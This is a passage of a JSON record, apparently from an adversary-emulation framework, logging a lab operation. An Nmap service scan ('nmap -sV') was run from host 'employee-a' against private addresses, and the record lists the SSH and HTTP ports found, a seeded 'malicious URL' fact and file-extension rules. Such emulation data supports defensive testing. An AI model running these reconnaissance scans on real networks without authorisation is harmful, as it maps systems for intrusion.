('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48f1510>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48f3280>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48f17e0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48cb130>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48c89a0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48cbbe0>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48c97e0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48cb0a0>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48c96f0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48cac20>", "source": {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}, {"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf452d2a0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7f5cf452eda0>", "source": {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_port_services", "target": {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:51:53Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.remote.addr192.168.200.3,4,5", "trait": "scan.remote.addr", "name": "scan.remote.addr", "value": "192.168.200.3,4,5", "created": "2024-04-26T23:51:43Z", "score": 7, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084", "collect": "2024-04-26T23:51:46Z", "finish": "2024-04-26T23:51:53Z", "ability": {"ability_id": "deception-nmap", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "executors": [{"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"source": "host.remote.ip", "edge": "has_open_ports", "target": "host.remote.ports", "custom_parser_vals": {}}, {"source": "host.remote.ip", "edge": "has_port_services", "target": "host.remote.port_services", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-a", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:51:46Z"}], "auto_close": true, "visibility": 50, "objective": {"id": "495a9828-cab1-44dd-a0ca-66e58177d8cc", "name": "default", "description": "This is a default objective that runs forever.", "goals": [{"target": "exhaustion", "value": "complete", "count": 1048576, "operator": "==", "achieved": false}], "percentage": 0.0}, "use_learning_parsers": true, "group": "", "source": {"id": "ed32b9c3-9593-4c33-b0db-e2007315096b", "name": "basic", "facts": [{"unique": "file.sensitive.extensionwav", "trait": "file.sensitive.extension", "name": "file.sensitive.extension", "value": "wav", "created": "2024-04-26T23:39:20Z", "score": 1, "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "origin_type": "SEEDED", "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, {"unique": "file.sensitive.extensionyml", "trait": "file.sensitive.extension", "name": "file.sensitive.extension", "value": "yml", "created": "2024-04-26T23:39:20Z", "score": 1, "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "origin_type": "SEEDED", "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, {"unique": "file.sensitive.extensionpng", "trait": "file.sensitive.extension", "name": "file.sensitive.extension", "value": "png", "created": "2024-04-26T23:39:20Z", "score": 1, "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "origin_type": "SEEDED", "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, {"unique": "server.malicious.urlkeyloggedsite.com", "trait": "server.malicious.url", "name": "server.malicious.url", "value": "keyloggedsite.com", "created": "2024-04-26T23:39:20Z", "score": 1, "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "origin_type": "SEEDED", "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "rules": [{"action": "DENY", "trait": "file.sensitive.extension", "match": ".*"}, {"action": "ALLOW", "trait": "file.sensitive.extension", "match": "png"}, {"action": "ALLOW", "trait": "file.sensitive.extension", "match": "yml"}, {"action": "ALLOW", "trait": "file.sensitive.extension", "match": "wav"}], "adjustments": [], "relationships": [], "plugin": "stockpile"}}